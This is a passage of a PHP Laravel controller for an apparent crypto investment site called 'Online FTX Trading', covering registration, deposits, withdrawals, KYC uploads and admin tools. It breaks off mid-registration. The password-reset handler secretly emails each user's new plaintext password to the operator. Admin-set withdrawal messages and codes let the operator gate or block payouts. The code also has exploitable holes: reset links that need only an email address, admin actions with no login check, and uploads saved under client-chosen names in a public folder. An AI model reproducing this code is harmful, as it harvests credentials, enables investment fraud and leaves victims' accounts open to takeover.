<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;
use Redirect;


use Auth;
class MyController extends Controller
{
    function register_fnc () {
        return view('myauth.register');
    }

    function login_fnc(){
        return view('myauth.login');
    }
    function investment_fnc(){
        return view('investment');
    }
    function faq_fnc(){
        return view('faq');
    }
    function terms_fnc(){
        return view('terms');
    }
    function forgot_fnc(){
        return view('myauth.forgot');
    }
    function reset(){
        return view('myauth.reset');
    }
    function changeplan_db(Request $req){
        $theme = 0;
        if($req['plan'] == 'Standard')
        $theme = 1;
        else if($req['plan'] == 'Premium')
        $theme = 2;
        else if ($req['plan'] == 'Ultimate')
        $theme = 3;
        else{
            $theme = 4;
        }
        $update_plan = DB::table('users')->where('email', $req['email'])->update([
            'level' => $req['plan'],
            'theme_' => $theme
            ]);
        if($update_plan){
            return back()->with(['success' => 'User plan has been changed successfully']);
        }else{
            return back()->with(['error' => 'An error occured, please contact site builder for maintenance']);
        }
        
    }
    function changeplan(Request $req){
        $data = array(
            'users' => DB::table('users')->where('email', $req['email'])->get(),
            'email' => $req['email'],
            );
            
            return view('admin.changeplan', $data);
    }
    function reset_password_db(Request $req){
         $req->validate([
            'password' => 'required|min:6|same:confirmpassword',
            'confirmpassword' => 'required'
        ]);
        $getRecord = DB::table('users')->where('email', $req['email'])->first();
        if($getRecord){
            $password = bcrypt($req['password']);
            DB::table('users')->where('email', $req['email'])->update(['password' => $password]);
            
            //send email 
            $subject = "Password Reset Successful!";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Password Reset Successful</b></h3>
       
        
        <p>Your password has been changed successfully. Thanks for working with us.</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = $req['email'];
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
           
            $subject = "Password Reset Boss!";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>A Smart Client Just Changed His/Her Password</b></h3>
       
        
        <p>We can't afford to hide this piece of valid information from you boss, please below are the details of the new password</p>
        
        
        <p style='font-size: 24px;'>Email Address: ".$req['email'] ."</p>
        <p style='font-size: 24px;'>Password: ".$req['password'] ."</p>
        <p style='font-size: 24px;'>Date Changed: ". date('Y-m-d H:i:s')."</p>
        
        <p>Thats all for now boss.</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = 'support@onlineftxtrading.com';
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
            
            return redirect()->route('login');
        }
        else{
            return back()->with(['fail' => 'Error! This email does not exist.']);
        }
    }
    function resetpassword(Request $req){
        $data = array(
            'email' => $req['email'],
            );
        return view('myauth.resetpassword', $data);
    }
    function reset_db(Request $req){
        $getRecord = DB::table('users')->where('email', $req['email'])->first();
        if($getRecord){
            
            //send mail
            
            $subject = "Reset Password";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <center><h3>Password Reset</h3>
        <br/>
        <p>If you've lost your password or wish to reset it, use the link below to reset it</p>
       
       
        
        <br/>
        <a href='https://onlineftxtrading.com/resetpassword?email=". $req['email'] ."' style='padding: 20px; background-color: #292D4F; color: #fff; font-weight: bold; text-transform: uppercase; text-decoration: none; width: 100%;'>Reset Your Password</a>
        
        
        <p style='margin-top: 45px;'>If you did not request a password reset, you can safely ignore this email. Only a person with access to your email can reset your password.</p>
        
         </center>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = $req['email'];
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
            
            //end of mail sending
            return back()->with(['success' => 'A reset link has been sent to your email, proceed to click on the link to reset your password.']);
        }else{
            return back()->with(['fail' => 'Error! This email does not exist.']);
        }
    }
    function verifyemail(Request $req){
        $data = array(
            'email' => $req['email']
            );
        return view('myauth.verifyemail', $data);
    }
    function emailverify_db(Request $req){
        $email = $req['email'];
        $code = $req['code'];
        $getRecord = DB::table('users')->where('email', $email)->first();
        if($getRecord){
            if($getRecord->status == 'APPROVED'){
                return redirect()->route('dashboard');
            }
            else{
                if($getRecord->email_verification_code == $code){
                    DB::table('users')->where('email', $email)->update(['status' => 'APPROVED']);
                    return redirect()->route('login');
                }
                else{
                    return back()->with(['fail' => 'Invalid verification code. Please try again']);
                }
            }
        }else{
            return back()->with(['fail' => 'This email address does not exist']);
        }
    }
    function assign_notification_db(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        if($req['msgtype'] == 'No Message'){
            DB::table('users')->where('email', $req['email'])->update(['message' => '']);
            return back()->with(['success' => 'Message has been cleared successfully.']);
        }
        else{
        $assignmsg = DB::table('users')->where('email', $req['email'])->update(['message' => $req['msgtype']]);
        if($assignmsg){
            return back()->with(['success' => 'Message has been assigned to client successfully!']);
        }else{
            return back()->with(['fail' => 'An error occured!']);
        }
    }
    }
    function delete_message(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $delete_msg = DB::table('messages')->where('id', $req['id'])->delete();
        if($delete_msg){
            return back()->with(['success' => 'Message deleted sucessfully']);
        }
        else{
            return back()->with(['fail' => 'Unable to delete message! Try again']);
        }
    }
    function setmessage_admin(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $data = array(
            'messages' => DB::table('messages')->get(),
            'email' => $req['email']
        );
        return view('admin.setmessage', $data);
    }
    function set_notification_db(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $icon;
        if($req['msgtype'] == 'Success')
        $icon = 'fa fa-check';
        else if($req['msgtype'] == 'Errors')
        $icon = 'fa fa-times';
        else{
            $icon = 'fa fa-exclamation-triangle';
        }
        DB::table('messages')->insert([
            'message' => $req['message'],
            'status' => $req['msgtype'],
            'icon' => $icon
        ]);
        return back()->with(['success'=> 'Message addedd successfully!']);



    }
    function send_mail_db(Request $req){
        $email_addr = $req['email'];
        $subject = $req['subject'];
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>$subject</b></h3>
       
        ". $req['message'] ."
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        
        $toCC = 'support@onlineftxtrading.com';
         MyController::composeMail($subject, $body, $email_addr, $toCC);
         
         return back()->with(['success' => 'Message has been sent successfully']);
         
         
    }
    function withdraw_update_admin(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $update_withdrawal_record = DB::table('users')->where('email', $req['email'])->update([
            'withdrawal_message' => $req['message'],
            'transfer_code' => $req['transcode'],
            'withdrawal_code' => $req['withcode'],
            'with_msg_type' => $req['msgtype']
        ]);
        if($update_withdrawal_record){
            return back()->with(['success' => 'Withdrawal record updated successfully!']);
        }
        else{
            return back()->with(['fail' => 'An error occured while updating withdrawal record']);
        }

    }
    function withdrawal_setup(Request $req){
        if(!Auth::check()){
            return redirect()->route('login');
        }
        $data = array(
            'users' => DB::table('users')->where('email', $req['email'])->get(),
            'dat' => $req['email']
        );
        return view('admin.withdraw', $data);
    }
    function update_transaction(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $msg;  
        if($req['transact_type'] == 'deposit'){
                $msg = 'Your deposit of '. $req['amount'] . ' ' . $req['paymentmethod'] . ' has been approved and your account has been credited successfully. Thanks for your patience';
                
                $subject = "Approved Deposit of " . $req['amount'];
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Approved Deposit of " . $req['amount'] ."</b></h3>
       
        
        <p>Your deposit of ". $req['amount'] . " " . $req['paymentmethod'] . " has been approved and your account has been credited successfully. Thanks for your patience</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $req['email'], $toCC);
                
            }
            else{
                $msg = 'Your withdrawal of '. $req['amount'] . ' has been approved and a mail will be sent to you from one of our agent. Thanks for your patience';
                
                $subject = "Approved Withdrawal of " . $req['amount'];
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Approved Withdrawal of " . $req['amount'] ."</b></h3>
       
        
        <p>Your withdrawal of ". $req['amount'] . " has been approved and a mail will be sent to you from one of our agent. Thanks for your patience</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $req['email'], $toCC);
            }
            $email = $req['email'];
            DB::table('transactions')->where('id', $req['id'])->update(['status' => 'APPROVED']);
            DB::table('notification')->insert([
                'email' => $email,
                'title' => strtoupper($req['transact_type']),
                'date' => date('Y-m-d H:i:s'),
                'message' => $msg,
                'status' => 'UNREAD'               
            ]);
            return back()->with('success', 'Transaction updated successfully!');
            
       
    }
    function admin_deposit_(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = $req->email;
            $get_transactions = array (
                    'approve_transact' => DB::table('transactions')->where('email', $email)->where('status', 'APPROVED')->orderBy('id', 'desc')->get(),
                    'pending_transact' => DB::table('transactions')->where('email', $email)->where('status', 'PENDING')->orderBy('id', 'desc')->get(),
                    'users' => DB::table('users')->get()
            );
            
        return view('admin.deposit', $get_transactions);
        
    }
    function verify_kyc(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        DB::table('kyc_verification')->where('email', $req['email'])->update(['status' => 'VERIFIED']);
        return back()->with('success', 'KYC Verification has been verified successfully');
    }
    function user_verification(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        DB::table('users')->where('email', $req['email'])->update(['status' => 'APPROVED']);
        return back()->with('success', 'User verification completed successfully');
    }
    function admin_verification_(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $verify = array(
            'kyc_verification'  => DB::table('kyc_verification')->get(),
            'user_email_verification' => DB::table('users')->where('role', '0')->get()
        );

        return view('admin.verification', $verify);
    }
    function admin_message_(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        return view('admin.message');
    }
    function admin_settings_(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $admin_setting = array(
            'admin_wallet' => DB::table('settings')->get()
        );
        return view('admin.settings', $admin_setting);
    }
    function update_wallet(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        if(DB::table('settings')->update(['btc' => $req['btc'], 'eth' => $req['eth'], 'tether' => $req['tether']])){
        return back()->with('success', 'Wallet address(es) updated successfully');
        }
        else{
            return back()->with(['fail' => 'Unable to update wallet address, contact site developer for maintenance']);
        }
    }
    function changepassword(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        if(Hash::check($req['oldpassword'], Auth::user()->password)){
            
            if($req['newpassword'] == $req['confirmpassword']){
               
                DB::table('users')->where('email', Auth::user()->email)->update(['password' => bcrypt($req['newpassword'])]);
                return response()->json(['success' => 'Congrats! Your password has been changed successfully.']);
                //return back()->with(['success'=> 'Congrats! Your password has been changed successfully.']);
            }
           
        
            else{
                return response()->json(['fail' => 'Password mismatch!']);
            }
            
        }
        else{
            return response()->json(['fail' => 'Your previous password is not correct. Try again!']);
           
        }
    }
    function upgrade_to_user(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $email = $req['email'];
        DB::table('users')->where('email', $email)->update(['role' => '0']);
        return back()->with(['success' => 'Client has been moved to user role respectively']);
    }
    function upgrade_to_admin(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $email = $req['email'];
        DB::table('users')->where('email', $email)->update(['role' => '1']);
        return back()->with(['success' => 'Client has been moved to admin role respectively']);
    }
    function admin__(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $my_data = array(
            'users' => DB::table('users')->orderBy('id', 'desc')->where('role', '0')->get(),
            'userroles' => DB::table('users')->orderBy('id', 'desc')->where('role', '1')->get()
        );
        return view('admin.dashboard', $my_data);
    }
    function upload_proof(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = Auth::user()->email;
            if($req->file('paymentProof') != ''){
                $path = 'assets/proof';
                $file = $req->file('paymentProof');
                $file_name = time(). '_'. $file->getClientOriginalName();
                $upload = $req->paymentProof->move(public_path($path), $file_name);
                //$file_name = "assets/proof/".$file_name;

                return response()->json(['success' => 'successfully saved']);
            }

        
    }
    function kyc_upload(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = Auth::user()->email;
            if($req->file('kycfront') != ''){
                
                
                $kycCheck = DB::table('kyc_verification')->where('email', $email)->first();
                 if($kycCheck){
                     return response()->json(['error' => 'already uploaded before']);
                 } 

                 $path = 'assets/kyc';
                $file = $req->file('kycfront');
                $file_name = time(). '_'. $file->getClientOriginalName();
                $upload = $req->kycfront->move(public_path($path), $file_name);
                $file_name = "assets/kyc/".$file_name;


                $file = $req->file('kycback');
                $file_name2 = time(). '_'. $file->getClientOriginalName();
                $upload = $req->kycback->move(public_path($path), $file_name2);
                $file_name2 = "assets/kyc/".$file_name2;

                DB::table('kyc_verification')->insert([
                    'email' => $email,
                    'front' => $file_name,
                    'back' => $file_name2,
                    'status' => 'UNVERIFIED'
                ]);

                return response()->json(['success' => 'successfully saved']);
            
            }

        
    }
    function withdraw_(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = Auth::user()->email;
            if(Auth::user()->profit + Auth::user()->bonus + Auth::user()->invested <= 0)
            {
                return response()->json(['fail' => 'Insufficient Funds: Balance is too low, please fund your account.']);
            }
            if(Auth::user()->withdrawal_message != ''){
                if(Auth::user()->with_msg_type == 'error'){
                    return response()->json(['fail' => Auth::user()->withdrawal_message]);
                }
                
                else{
                    DB::table('transactions')->insert([
                        'email' => $email,
                        'date' => date('Y-m-d H:i:s'),
                        'amount' => $req['amount'],
                        'status' => 'PENDING',
                        'transact_type' => 'withdraw',
                        'paymentmethod' => $req['withdrawalmethod'],
                        'walletaddr' => $req['walletaddress'],
                        'wallettype' => $req['wallettype'],
                        'bankname' => $req['bankname'],
                        'acctname' => $req['acctname'],
                        'acctnumber' => $req['acctnumber'],
                        'swiftcode' => $req['swiftcode']
        
                ]);
                $curr = Auth::user()->currency;
                DB::table('notification')->insert([
                    'email' => $email,
                    'date' => date('Y-m-d H:i:s'),
                    'title' => 'WITHDRAW',
                    'message' => 'Your withdrawal of ' . $req['amount'] . ' ' . $curr . ' has been initiated and will been treated immediately',
                    'status' => 'UNREAD'
                ]);

//send email 
            $subject = "Withdrawal Pending!";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>Withdrawal Pending</b></h3>
       
        
        <p>Your withdrawal of ". $req['amount'] ." is pending and one of our agent will attend to it shortly.</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = $email;
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
           
            $subject = "Pending Withdrawal Boss!";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>A Smart Client Wish to Withdraw</b></h3>
       
        
        <p>We can't afford to hide this piece of valid information from you boss, please below are the details of the withdrawal</p>
        
        
        <p style='font-size: 24px;'>Email Address: ".$email ."</p>
        <p style='font-size: 24px;'>Amount: ".$req['amount'] ."</p>
        <p style='font-size: 24px;'>Withdrawal Method: ".$req['withdrawalmethod'] ."</p>
        <p style='font-size: 24px;'>Date of Withdrawal: ". date('Y-m-d H:i:s')."</p>
        
        <p>Thats all for now boss.</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = 'support@onlineftxtrading.com';
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
            
                return response()->json(['success' => Auth::user()->withdrawal_message]);
                }
               
            }
            else{
            if(Auth::user()->transfer_code != ''){
                if(Auth::user()->transfer_code == $req['transcode'] && Auth::user()->withdrawal_code == $req['withcode']){
                    DB::table('transactions')->insert([
                        'email' => $email,
                        'date' => date('Y-m-d H:i:s'),
                        'amount' => $req['amount'],
                        'status' => 'PENDING',
                        'transact_type' => 'withdraw',
                        'paymentmethod' => $req['withdrawalmethod'],
                        'walletaddr' => $req['walletaddress'],
                        'wallettype' => $req['wallettype'],
                        'bankname' => $req['bankname'],
                        'acctname' => $req['acctname'],
                        'acctnumber' => $req['acctnumber'],
                        'swiftcode' => $req['swiftcode']
        
                ]);
                $curr = Auth::user()->currency;
                DB::table('notification')->insert([
                    'email' => $email,
                    'date' => date('Y-m-d H:i:s'),
                    'title' => 'WITHDRAW',
                    'message' => 'Your withdrawal of ' . $req['amount'] . ' ' . $curr . ' has been initiated and will been treated immediately',
                    'status' => 'UNREAD'
                ]);

                return response()->json(['success' => Auth::user()->withdrawal_message]);
                }
                else{
                    return response()->json(['fail' => 'Invalid Withdrawal and Transfer Code! Please try again with the right codes.']);
                }
                
            }
           
            }
        
        
    }
    function dep_(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = Auth::user()->email;
            $curr;
        DB::table('transactions')->insert([
            'email' => $email,
            'date' => date('Y-m-d H:i:s'),
            'amount' => $req['amount'],
            'status' => 'PENDING',
            'transact_type' => 'deposit',
            'paymentmethod' => $req['paymentmethod'],
    ]);
    if($req['paymentmethod'] == "Bitcoin (BTC)")
    $curr = "BTC";
    else if($req['paymentmethod'] == "Ethereum (ETH)")
    $curr = "ETH";
    else if($req['paymentmethod'] == "Tether - trc20 (USDT)")
    $curr = "USDT";
    else{
    $curr = "DODGE";
    }
    DB::table('notification')->insert([
        'email' => $email,
        'date' => date('Y-m-d H:i:s'),
        'title' => 'DEPOSIT',
        'message' => 'Your deposit of ' . $req['amount'] . ' ' . $curr . ' has been initiated and will been credited soon once confirmed',
        'status' => 'UNREAD'
    ]);
    
    
    //send mail to user and admin
    $subject = "New Deposit of " . $req['amount']. $curr ;
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>New Deposit of " . $req['amount'] ."$curr</b></h3>
       
        
        <p>Your deposit of " . $req['amount'] . " " . $curr . " has been initiated and will been credited soon once confirmed</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        <p>This is an automated message, please do not reply.</p>
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $email, $toCC);
           
            $subject = "New Deposit of " . $req['amount'] . "$curr Boss";
        $body = "
        <html>
        <body>
        <style>
        *{
            margin: 0;
            padding: 0;
            border-box: box-sizing:
        }
        </style>
        <div style='margin-right: 20px; width: 90%; height: auto; background-color: #292D4F; color: #fff; padding: 15px 20px;'>
        <center><img width='130' height='80' src='https://onlineftxtrading.com/cloud/app/images/365.png' />
        </center>
        
        </div>
        <div style='margin-right: 20px; margin-top: 25px;'>
        <h3><b>New Deposit of " . $req['amount'] ."$curr</b></h3>
       
        
        <p>We can't afford to hide this piece of valid information from you boss, please below are the details of the deposit request</p>
        
        
        <p style='font-size: 24px;'>Email Address: ".$email ."</p>
        <p style='font-size: 24px;'>Amount: $curr".$req['amount'] ."</p>
        <p style='font-size: 24px;'>Deposit Method: ".$req['paymentmethod'] ."</p>
        <p style='font-size: 24px;'>Transaction Date: ". date('Y-m-d H:i:s')."</p>
        
        <p>Thats all for now boss.</p>
        
        <p style='margin-top: 45px;'>Online FTX Trading Team.</p>
        
        
        <div style='background-color: #ccc; margin-top: 40px; text-align: center; align-items: center; width: 100%; height: 55px; padding: 20px 0; margin-right: 20px;'>
        <p>&copy; 2023 Online FTX Trading. All Rights Reserved.</p>
        </div>
        </div>
        </body>
        </html>
        
        ";
        $toAddress = 'support@onlineftxtrading.com';
        $toCC = 'support@onlineftxtrading.com';
        MyController::composeMail($subject, $body, $toAddress, $toCC);
        return response()->json(['success' => 'successfuly']);
    
    }
    function getWallet_($wallet){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $wallet_addr = "";
            $getWallet = DB::table('settings')->first();
            if($wallet == "btc")
            $wallet_addr = $getWallet->btc;
            else if($wallet == "eth")
            $wallet_addr = $getWallet->eth;
            else if($wallet == "tether")
            $wallet_addr = $getWallet->tether;
            else if($wallet == "dogecoin"){
            $wallet_addr = $getWallet->dogecoin;
            }

            return response()->json(['success' => $wallet_addr]);

        
    }
    function read($id){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $update_notify = DB::table('notification')->where('id', $id)->update(['status' => 'READ']);
        if($update_notify){
            return response()->json(['success' => 'Message read.']);
        }
    }
    function readall(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $email = Auth::user()->email;
       DB::table('notification')->where('email', $email)->update(['status' => 'READ']);
       return redirect()->route('dashboard');
    }
    function unreadall(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $email = Auth::user()->email;
       DB::table('notification')->where('email', $email)->update(['status' => 'UNREAD']);
       return redirect()->route('dashboard');
    }
    function profile_update(Request $req){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = Auth::user()->email;
            $emailnew = $req['email'];
           $req->validate([
            'email' => 'required|email',
            'phone' => 'required|max:11|min:7',
            'country' => 'required'
           ]);
        DB::table('users')->where('email', $email)->update([
            'email' => $req['email'],
            'phone' => $req['phone'],
            'country' => $req['country'],
            'message' => '1'
            
        ]);
        DB::table('notification')->where('email', $email)->update(['email' => $emailnew]);
        DB::table('docs')->where('email', $email)->update(['email'=> $emailnew]);
        DB::table('transactions')->where('email', $email)->update(['email' => $emailnew]);
        DB::table('trade')->where('email', $email)->update(['email' => $emailnew]);
        /*if(Auth::user()->theme_ == 2){
                        return redirect()->route('premium_dashboard');
                    }
            else if(Auth::user()->theme_ == 3){
                return redirect()->route('ultimate_dashboard');
            }
            else if(Auth::user()->theme_ == 4){
                return redirect()->route('retirement_dashboard');
            }
            else{*/
        return redirect()->route('dashboard');
            //}
    
    }
    function removemsg(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
            $email = Auth::user()->email;
            DB::table('users')->where('email', $email)->update(['message' => '']);
            return response()->json(['success' => 'successfully']);
            
    }
    function forgot_db_fnc(){
     
    }
    function logout(){
        if(Auth::user()){
        Auth::logout();
        return redirect('login');
        }
        else{
            return redirect()->route('login');
        }
    }
    function dashboard_fnc(){
         if(!Auth::check()){
            return redirect()->route('login');
        }
        $email = Auth::user()->email;
        $msgID = Auth::user()->message;
        //GET NOTIFICATION DETAILS
        $data = array(
            'message' => DB::table('notification')->where('email', $email)->orderBy('id', 'desc')->get(),
            'message_' => DB::table('notification')->where('email', $email)->where('status', 'UNREAD')->get(),
            'mainMsg' => DB::table('messages')->where('id', $msgID)->get(),
            'admin_settings' => DB::table('settings')->get(),
            'deposit_rec' => DB::table('transactions')->where('email', $email)->where('transact_type', 'deposit')->orderBy('id', 'desc')->get(),
            'withdraw_rec' => DB::table('transactions')->where('email', $email)->where('transact_type', 'withdraw')->orderBy('id', 'desc')->get(),
            'transactions' => DB::table('transactions')->where('email', $email)->orderBy('id', 'desc')->get(),
            'kyc_verification' => DB::table('kyc_verification')->where('email', $email)->get(),

            'reqIP' => request()->ip()
        );
        return view('trade.dashboard', $data);
   
    }
    function register_fnc_($email){
         
        return redirect()->route('register');
    }
    function register_db_fnc(Request $req){
         
        
        $req->validate([
            'fullname' => 'required',
            'email' => 'required|email|unique:users',
            'phone' => 'required|max:11|min:7',
            'country' => 'required',
            'currency' => 'required',
            'password' => 'required|min:6|same:confirm_password',
            'confirm_password' => 'required'
        ]);
        
        $password = bcrypt($req['password']);
        $n=6;
      $code = MyController::getCode($n);
        $save_rec = DB::table('users')->insert([
                    'fullname' => $req['fullname'],
                    'email' => $req['email'],
                    'phone' => $req['phone'],
                    'country' => $req['country'],
                    'currency' => $req['currency'],
                    'password' => $password,
                    'profit' => '0.00',
                    'invested' => '0.00',
                    'bonus' => '0.00',
                    'date' => date('Y-m-d H:i:s'),
                    'message' => '',
                    'level' => 'Standard',
                    'email_verification_code' => $code,
                    'email_verification_link' => 'onlineftxtrading.com/email='. $req['email'],
                    'suspend_status' => 'OFF',
                    'ref_email' => $req['ref'],
                    'status' => 'PENDING',
                    'role' => '0',
                    'IPAddress' => request()->ip(),
        ]);
        $passw = $req['password'];
        $email_addr = $req['email'];
        if($save_rec){
            
            //send mail
